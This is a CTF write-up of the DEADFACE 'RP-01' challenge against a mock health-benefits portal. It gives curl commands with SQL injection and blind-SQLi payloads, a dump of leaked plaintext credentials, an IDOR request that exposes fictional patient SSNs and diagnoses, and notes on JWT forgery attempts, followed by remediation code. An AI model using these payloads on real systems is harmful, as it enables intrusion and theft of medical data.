# RP-01 — Real Pain in the Prostate

**Event:** DEADFACE CTF
**Category:** Web
**Target:** `http://45.79.200.170:3000/` (Health Spark Employer & Benefits Portal)
**Flag:** `deadface{hipaa_exposure_is_bad}`

---

## TL;DR

The employer portal authenticates users into a *single department* of member PHI
records, but the department is chosen by the **client**. `POST /api/patients`
takes `departmentid` straight out of the request body and never compares it to
the `departmentid` claim inside the caller's JWT. Changing one integer moves you
from your own 10 members into another employer's 10 members — names, SSNs, dates
of birth and diagnoses.

Getting a valid session is trivial because `POST /api/login` is SQL-injectable
and, on a failed password check, still returns the matched database row (with the
plaintext password) in an HTTP 200 response.

```
john.smith's token + {"departmentid": 18432}  ->  Patient Zero, diagnosis: deadface{hipaa_exposure_is_bad}
```

---

## 1. Enumeration

The landing page is a plain Express static login form. It is worth reading the
HTML rather than just looking at it, because the developer left notes:

```html
<!-- No session issued -- bad creds, or the SQLi disclosure (HTTP 200 with
     no token). Show the server's message; the response body may contain
     more than the UI chooses to display. -->
```

and on `/dashboard`:

```html
<!-- Account self-service removed: profile is read-only -->
<!-- Admin tools (UI shown to all signed-in users; the server enforces admin) -->
```

Three things fall out of that:

1. `/api/login` is SQL-injectable, and the injection **discloses data in the
   response body** while still returning HTTP 200 with no token.
2. `/dashboard` posts a `departmentid` to `/api/patients`.
3. There is an admin-only SSRF (`/api/admin/fetch-photo`) — a red herring for
   this challenge, see [Dead ends](#dead-ends).

> At the time of the first pass the dashboard also carried a third comment,
> `<!-- WEB01: deadface{web01_dashboard_recon} -->`. It has since been removed
> from the deployment — it belongs to the recon challenge in the series, not to
> RP-01, and the solver treats it as optional.

A quick route sweep confirms the API surface is only three endpoints:

| Route | Method | Auth |
|---|---|---|
| `/api/login` | POST | none |
| `/api/patients` | POST | Bearer JWT |
| `/api/admin/fetch-photo` | POST | Bearer JWT, `role=admin` |

```bash
for p in api/patients api/users api/me api/departments; do
  curl -s -o /dev/null -w "%{http_code}  /$p\n" http://45.79.200.170:3000/$p
done
# 404 on GET - /api/patients is POST-only
```

---

## 2. Vulnerability #1 — SQL injection in `/api/login`

The dashboard JavaScript sends `{username, password}` as JSON. The server builds
the lookup by string interpolation into SQLite:

```sql
SELECT * FROM users WHERE username = '<username>' AND password = '<password>'
```

Because the row is fetched *before* the password is compared, and the failure
path still serialises the row into the response, an always-true `WHERE` clause
turns the login form into a data-disclosure primitive.

### Payload

```bash
curl -s -X POST http://45.79.200.170:3000/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"'"'"' OR 1=1-- -","password":"x"}'
```

### Response

```json
{
  "message": "Login failed. That's weird... check the network traffic!",
  "username": "john.smith",
  "name": "John Smith",
  "role": "user",
  "departmentid": 10685,
  "password": "Locked_In_And_Ready",
  "flag": "deadface{typical_and_classic}"
}
```

HTTP **200**, no `token`, and the plaintext password. That is the disclosure the
source comment was hinting at — and it is the SQLi stage's own flag.

### Dumping the rest of the table

`LIMIT 1` style behaviour means we get one row per request, but the injected
`WHERE` clause lets us choose *which* one:

```sql
' OR username NOT IN ('john.smith')-- -
```

Iterating that gives the whole `users` table:

| username | password | departmentid | role |
|---|---|---|---|
| john.smith | Locked_In_And_Ready | 10685 | user |
| maria.holloway | nAEPMHfSXXPFFTJuoZrq | 18432 | user |
| devon.pearce | d8KiRYzxCRqxJWLgYFbJ | 18432 | user |
| aisha.nakamura | gc1nNwxfuHTMWEyXADJB | 18432 | user |

> Credentials rotate between deployments — the solver re-extracts them at run
> time instead of hard-coding.

Two departments appear: **10685** (ours) and **18432** (three other employers).
That is the pivot for stage 3.

### Blind variant (if the disclosure is ever patched out)

`UNION SELECT` with 1–8 columns never returned a row (the table has six columns,
so this looks like a keyword filter rather than a column-count mismatch), but the
response is a clean boolean oracle — a true condition returns the first row, a
false one returns `Invalid credentials`:

```sql
' OR (SELECT count(*) FROM users)=5-- -
' OR (SELECT count(*) FROM users WHERE role='admin')=0-- -
' OR unicode(substr((SELECT sql FROM sqlite_master WHERE name='users'),1,1))>67-- -
```

That is enough to reconstruct the schema by binary search:

```sql
CREATE TABLE users (id INTEGER, username TEXT, name TEXT,
                    password TEXT, role TEXT, departmentid INTEGER)
```

`sqlite_master` lists exactly one table, and `count(*) WHERE role='admin'` is
**0** — there is no administrator account in the database.

---

## 3. Vulnerability #2 — IDOR / broken object-level authorization

Log in with the leaked credentials and look at what the dashboard sends:

```javascript
const body = { departmentid: parseInt(dept, 10), FirstNameFilter: '', ... };
fetch('/api/patients', { method: 'POST', headers: { Authorization: 'Bearer ' + token }, body: JSON.stringify(body) });
```

The JWT already carries a `departmentid` claim:

```json
{"sub":"john.smith","name":"John Smith","role":"user","departmentid":10685,"iat":...,"exp":...}
```

but the server reads the department from the **body** and never checks that the
two agree. So we take our own valid token and ask for someone else's department:

```bash
TOKEN=$(curl -s -X POST http://45.79.200.170:3000/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"john.smith","password":"Locked_In_And_Ready"}' \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')

curl -s -X POST http://45.79.200.170:3000/api/patients \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"departmentid":18432,"FirstNameFilter":"","LastNameFilter":"","take":null,"skip":0}'
```

### Response (trimmed)

```json
{
  "departmentid": 18432,
  "totalRows": 10,
  "members": [
    {"name":"Naomi Schwartz","memberId":"HS-8820341","ssn":"301-55-9920","diagnosis":"Coronary artery disease", ...},
    {"name":"Felix Duarte","memberId":"HS-8820342","ssn":"329-41-1183","diagnosis":"Chronic kidney disease, stage 3", ...},
    {"name":"Patient Zero","memberId":"HS-8820343","ssn":"000-00-0000","email":"records.exposed@example.com",
     "dob":"1990-01-01","diagnosis":"deadface{hipaa_exposure_is_bad}","plan":"Spark Premier PPO"},
    ...
  ]
}
```

Ten members of a different employer — full PHI, including SSNs — for the price of
changing `10685` to `18432`. Note the server also happily echoes back the
`departmentid` you asked for, so nothing in the response suggests you are out of
bounds.

**Flag:** `deadface{hipaa_exposure_is_bad}`

---

## 4. Root cause

| # | Issue | CWE |
|---|---|---|
| 1 | Credentials interpolated into SQL; matched row returned on auth failure | CWE-89, CWE-209 |
| 2 | Plaintext passwords stored and disclosed | CWE-256, CWE-522 |
| 3 | Object-level authorization taken from user-controlled input | CWE-639 / CWE-284 |
| 4 | Over-broad response: full PHI (SSN, DOB, diagnosis) for a list view | CWE-359 |

The single design flaw behind the flag is #3: the JWT is treated as proof of
*authentication* and then ignored as the source of *authorization*. The
`departmentid` claim exists, is signed, and is never read.

---

## 5. Remediation

```js
// vulnerable
const rows = db.prepare(
  `SELECT * FROM patients WHERE departmentid = ${req.body.departmentid}`
).all();

// fixed: scope comes from the verified token, never from the body
const dept = req.user.departmentid;          // from the validated JWT
if (req.body.departmentid != null && Number(req.body.departmentid) !== dept) {
  return res.status(403).json({ error: 'Forbidden' });
}
const rows = db.prepare(
  'SELECT * FROM patients WHERE departmentid = ?'
).all(dept);                                  // parameterised
```

Plus, in order of impact:

1. **Parameterise every query.** Never concatenate user input into SQL.
2. **Hash passwords** with bcrypt/argon2 and never return the hash — let alone
   the plaintext — from an authentication endpoint.
3. **Return a generic error** on failed login. Distinguishing "bad password"
   from "no such user" and echoing the row is what made stage 2 one request.
4. **Minimise PHI in list responses.** A member list does not need SSNs; mask
   them (`***-**-1234`) and require a separate, audited, per-record action to
   reveal full values. This is a HIPAA minimum-necessary problem, not just a
   web bug.
5. **Log and alert on cross-department reads.** Every request already carries
   both identities — mismatch is a high-signal detection.

---

## 6. Solve script

`solve.py` reproduces the whole chain with the standard library only:

```bash
python3 solve.py                       # defaults to http://45.79.200.170:3000
python3 solve.py http://host:port      # any other deployment
```

```
[*] Stage 1 - recon /dashboard
    [-] no flag in dashboard source
[*] Stage 2 - SQL injection on /api/login
    [+] leaked row: john.smith / Locked_In_And_Ready (dept 10685, role user)
    [+] SQLi flag: deadface{typical_and_classic}
    [+] users table (4 rows):
        john.smith       Locked_In_And_Ready    dept 10685  role user
        maria.holloway   ...                    dept 18432  role user
        ...
[*] Stage 3 - IDOR on /api/patients
    [+] authenticated as john.smith (own dept 10685)
    [*] other departments to try: [18432]
    [*] dept 18432  -> HTTP 200, 10 members
    [+] Patient Zero (HS-8820343, SSN 000-00-0000) -> deadface{hipaa_exposure_is_bad}

  >>> SUBMIT: deadface{hipaa_exposure_is_bad}
```

The script derives the target department from the enumerated users rather than
hard-coding `18432`, so it keeps working if the deployment is re-seeded.

---

## Dead ends

Worth recording, because each one looks like the next step and isn't.

**JWT forgery.** `/api/admin/fetch-photo` is a real SSRF, but it is gated on
`role === 'admin'` and the database contains **no** admin row
(`count(*) WHERE role='admin'` = 0). `alg:none` and an empty-secret signature
both return `Invalid or expired token`. The HS256 secret is not in rockyou
(14.3M entries) nor in the 104k-entry `jwt.secrets.list`, and no source, backup
or `.env` is exposed through the static root. The admin panel is a hook for a
later challenge in the series, not for this one.

**Department brute force.** The two department IDs are random five-digit values,
so enumerating the space looks attractive — but `/api/patients` is throttled to
roughly 7–8 req/s (~1000 per two minutes). A 90,000-ID sweep is a ~3 hour job and
the throttling is the only thing you achieve. The intended discovery path is the
`users` table dump, which hands you `18432` for free.

**Filter injection.** `FirstNameFilter` / `LastNameFilter` look like classic
`LIKE '%...%'` sinks but are parameterised — a quote in either changes nothing.
`departmentid` is coerced with `parseInt`, so `"10685 OR 1=1"` silently becomes
`10685`.

**Static data.** Patient records are hardcoded in the application, not in
SQLite — `sqlite_master` contains only `users`, which is why the patient
endpoint can be parameterised while the login endpoint cannot.
